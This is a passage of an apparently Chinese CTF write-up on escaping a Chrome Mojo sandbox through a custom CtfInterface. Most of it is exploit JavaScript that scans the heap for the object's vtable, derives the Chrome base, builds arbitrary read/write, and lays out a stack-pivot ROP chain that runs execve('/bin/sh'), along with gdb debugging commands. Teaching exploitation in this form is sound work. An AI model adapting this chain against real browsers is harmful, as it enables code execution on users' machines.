<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h4 id="Sandbox-Escape"><a href="#Sandbox-Escape" class="headerlink" title="Sandbox Escape"></a>Sandbox Escape</h4><p>刷新页面之后就开启了 Mojo，可以开始与 Mojo 交互了</p>
<p>先写好与 CtfInterface 交互的函数：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">ctfRead</span><span class="token punctuation">(</span><span class="token parameter">ctf<span class="token punctuation">,</span> offset</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> f_b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Float64Array</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> i_b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigUint64Array</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">let</span> float_val <span class="token operator">=</span>  <span class="token keyword">await</span> ctf<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">r</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> r<span class="token punctuation">.</span>value<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    f_b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> float_val<span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">BigInt</span><span class="token punctuation">(</span>i_b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span><span class="token parameter">ctf<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> f_b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Float64Array</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> i_b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigUint64Array</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>

    i_b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token keyword">await</span> ctf<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>f_b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> offset<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">r</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> r<span class="token punctuation">.</span>value<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">ctfResize</span><span class="token punctuation">(</span><span class="token parameter">ctf<span class="token punctuation">,</span> size</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token keyword">await</span> ctf<span class="token punctuation">.</span><span class="token function">resizeVector</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">r</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> r<span class="token punctuation">.</span>value<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">ctfCreate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> ctf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">blink<span class="token punctuation">.</span>mojom<span class="token punctuation">.</span>CtfInterfacePtr</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> req <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mojo<span class="token punctuation">.</span>makeRequest</span><span class="token punctuation">(</span>ctf<span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    Mojo<span class="token punctuation">.</span><span class="token function">bindInterface</span><span class="token punctuation">(</span>blink<span class="token punctuation">.</span>mojom<span class="token punctuation">.</span>CtfInterface<span class="token punctuation">.</span>name<span class="token punctuation">,</span> req<span class="token punctuation">.</span>handle<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> ctf<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>由于与 Mojo 的通信方式大多数是回调的方式（从 C++ 源码中也可以发现），基本都是异步的，为了方便，使用 async 的函数来写</p>
<p>Mojo 与 v8 运行在不同的进程里，我们还要 leak 出 Mojo 所在进程的地址，才能在后续构造 ROP 拿 shell</p>
<p>逆向可以发现 Ctf 对象存在如下结构：</p>
<pre class="line-numbers language-none"><code class="language-none">+ 0x00 vtable_ptr
+ 0x08 vector_base
+ 0x10 vector_end<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>只要通过越界写，更改 vtable_ptr 即可劫持虚表，从而劫持程序控制流，控制 <code>vector_base</code> 和 <code>vector_base</code> 字段还可以方便的进行任意地址的读写</p>
<h5 id="find-Ctf-Object"><a href="#find-Ctf-Object" class="headerlink" title="find Ctf Object"></a>find Ctf Object</h5><p>由于 Mojo 对象的内存地址不稳定， 需要不断的分配对象，根据特征，直到找到为止：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> vec_base <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> vec_end <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> size <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> rop_len <span class="token operator">=</span> <span class="token number">0x10</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> vtable <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> vtable_offset <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> ctf<span class="token punctuation">,</span> arb<span class="token punctuation">;</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'finding vector address...'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">while</span> <span class="token punctuation">(</span>vtable_offset <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    ctf <span class="token operator">=</span> <span class="token function">ctfCreate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    arb <span class="token operator">=</span> <span class="token function">ctfCreate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">await</span> <span class="token function">ctfResize</span><span class="token punctuation">(</span>ctf<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">await</span> <span class="token function">ctfResize</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> rop_len<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>ctf<span class="token punctuation">,</span> i<span class="token punctuation">,</span> <span class="token number">0xfebabedeadbeefn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> rop_len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> i<span class="token punctuation">,</span> <span class="token number">0xfebabedeadbeefn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0x1000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> val <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">ctfRead</span><span class="token punctuation">(</span>ctf<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>val <span class="token operator">&amp;</span> <span class="token number">0xfffn</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x4e0n</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//(vtable &amp; 0xfff) == 0x4e0</span>
            <span class="token keyword">let</span> base <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">ctfRead</span><span class="token punctuation">(</span>ctf<span class="token punctuation">,</span> i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">let</span> end <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">ctfRead</span><span class="token punctuation">(</span>ctf<span class="token punctuation">,</span> i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            
            <span class="token keyword">if</span> <span class="token punctuation">(</span>end <span class="token operator">></span> base <span class="token operator">&amp;&amp;</span> <span class="token function">Number</span><span class="token punctuation">(</span>end <span class="token operator">-</span> base<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">8</span> <span class="token operator">*</span> rop_len<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// found!</span>
                vtable <span class="token operator">=</span> <span class="token function">BigInt</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>
                vec_base <span class="token operator">=</span> <span class="token function">BigInt</span><span class="token punctuation">(</span>base<span class="token punctuation">)</span><span class="token punctuation">;</span>
                vec_end <span class="token operator">=</span> <span class="token function">BigInt</span><span class="token punctuation">(</span>end<span class="token punctuation">)</span><span class="token punctuation">;</span>
                vtable_offset <span class="token operator">=</span> i<span class="token punctuation">;</span>

                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>vtable_offset<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">: vtable = 0x</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>vtable<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">, vec_base = 0x</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>vec_base<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">, vec_end = 0x</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>vec_end<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>

        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> <span class="token comment">// for (let i = 4; i &lt; 0x1000; i++)</span>
<span class="token punctuation">&#125;</span> <span class="token comment">// while (vec_base == 0)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>同时得知了 Ctf 对象的虚表指针，可以计算得到程序的基址：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> chrome_base <span class="token operator">=</span> vtable <span class="token operator">-</span> <span class="token number">0xbc774e0n</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后还可以构造任意地址读写：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">arb_read</span><span class="token punctuation">(</span><span class="token parameter">addr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    
    <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>ctf<span class="token punctuation">,</span> vtable_offset<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>ctf<span class="token punctuation">,</span> vtable_offset<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">,</span> addr<span class="token operator">+</span><span class="token number">8n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">let</span> val <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">ctfRead</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>ctf<span class="token punctuation">,</span> vtable_offset<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> vec_base<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>ctf<span class="token punctuation">,</span> vtable_offset<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">,</span> vec_end<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> val<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">arb_write</span><span class="token punctuation">(</span><span class="token parameter">addr<span class="token punctuation">,</span> val</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    
    <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>ctf<span class="token punctuation">,</span> vtable_offset<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>ctf<span class="token punctuation">,</span> vtable_offset<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">,</span> addr<span class="token operator">+</span><span class="token number">8n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">let</span> val <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>ctf<span class="token punctuation">,</span> vtable_offset<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> vec_base<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>ctf<span class="token punctuation">,</span> vtable_offset<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">,</span> vec_end<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> val<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>不过最终的 exp 中没有用到上面的任意地址读写的函数</p>
<h5 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h5><p>为什么要使用 ROP，而不是利用上面的任意地址读写，来泄露 libc 地址再改 <code>__free_hook</code> 的方式呢？</p>
<p>有多种原因：</p>
<ol>
<li>题目没有给 libc，泄露了 libc 地址，还得麻烦去查是上面版本的 libc</li>
<li>程序是 C++，调试的时候发现，malloc 和 free 都不是 glibc 里的 malloc 和 free，实际是 C++ 的 allocator，虽然调试的时候发现同样有类似的 hook，但是参数不好控制</li>
<li>程序使用了 execve，只要知道程序基址，很容易就可以算出 plt 的位置，不需要过多的 leak</li>
</ol>
<p>要想 ROP 就要控制栈，直接布局 ROP 在栈上是不太可能的，可以考虑栈迁移</p>
<p>调试下 chrome：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ python3 -m http.server <span class="token operator">&amp;</span>
$ gdb chromium/chrome
<span class="token builtin class-name">set</span> args --headless --disable-gpu --remote-debugging-port<span class="token operator">=</span><span class="token number">9222</span> --user-data-dir<span class="token operator">=</span>/tmp/userdata --enable-logging<span class="token operator">=</span>stderr --js-flags<span class="token operator">=</span><span class="token string">"--allow-natives-syntax"</span> http://127.0.0.1:8000/exploit.html
<span class="token builtin class-name">set</span> follow-fork-mode parent
b CtfInterfaceImpl::Read<span class="token punctuation">(</span>unsigned int, base::OnceCallback<span class="token operator">&lt;</span>void <span class="token punctuation">(</span>double<span class="token punctuation">)</span><span class="token operator">></span><span class="token punctuation">)</span>
r<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以发现调用方法的时候，rax 寄存器存的就是虚表的指针：<br><img src="/images/68622871/11.png" alt="debug"></p>
<p>程序含有 <code>xchg rax, rsp; ret</code> 的 gadget，那么可以栈迁移到虚表的地方进行 ROP，可以先伪造一个虚表，布置 ROP，然后改写 vtable 指针指向伪造的虚表，触发 <code>xchg rax, rsp; ret</code> 后栈迁移进行 ROP，执行 <code>execve(&quot;/bin/sh&quot;, &#123;NULL&#125;, &#123;NULL&#125;</code> 即可：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> fake_vtable <span class="token operator">=</span> vec_base<span class="token punctuation">;</span>
<span class="token keyword">let</span> rop_base <span class="token operator">=</span> vec_base<span class="token punctuation">;</span>

<span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> chrome_base <span class="token operator">+</span> <span class="token number">0x3d994e1n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// add rsp, 0x20; pop rbp; ret;</span>
<span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> chrome_base <span class="token operator">+</span> <span class="token number">0x590510en</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// xchg rax, rsp; ret; -> ResizeVector (rax = vtable)</span>

<span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> chrome_base <span class="token operator">+</span> <span class="token number">0x37bb280n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// pop rdi</span>
<span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> rop_base<span class="token operator">+</span><span class="token number">14n</span><span class="token operator">*</span><span class="token number">8n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// addrOf"/bin/sh"</span>

<span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> chrome_base <span class="token operator">+</span> <span class="token number">0x099b8ee0n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// pop rsi</span>
<span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> rop_base <span class="token operator">+</span> <span class="token number">13n</span> <span class="token operator">*</span> <span class="token number">8n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// args</span>

<span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> chrome_base <span class="token operator">+</span> <span class="token number">0x3655332n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// pop rdx</span>
<span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> rop_base <span class="token operator">+</span> <span class="token number">13n</span> <span class="token operator">*</span> <span class="token number">8n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// env</span>

<span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> execve_plt<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// env</span>
<span class="token comment">// await ctfWrite(arb, 13, rop_base + 14n * 8n);       // addrOf"/bin/sh"</span>
<span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">0n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment">// NULL</span>
<span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">0x68732f6e69622fn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// "/bin/sh"</span>
<span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">0n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment">// NULL</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'change vtable ...'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>ctf<span class="token punctuation">,</span> vtable_offset<span class="token punctuation">,</span> fake_vtable<span class="token punctuation">)</span><span class="token punctuation">;</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'pwn!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">await</span> <span class="token function">ctfResize</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">0x2333</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<p>最终从 chrome 到拿 shell 的完整 exp 如下：</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mojo/mojo_bindings.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mojo/third_party/blink/public/mojom/CTF/ctf_interface.mojom.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
<span class="token keyword">let</span> conversion_buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> float_view <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Float64Array</span><span class="token punctuation">(</span>conversion_buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> int_view <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigUint64Array</span><span class="token punctuation">(</span>conversion_buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">BigInt</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">hex</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token string">'0x'</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token class-name">BigInt</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">i2f</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    int_view<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> float_view<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token class-name">Number</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">f2i</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    float_view<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> int_view<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>



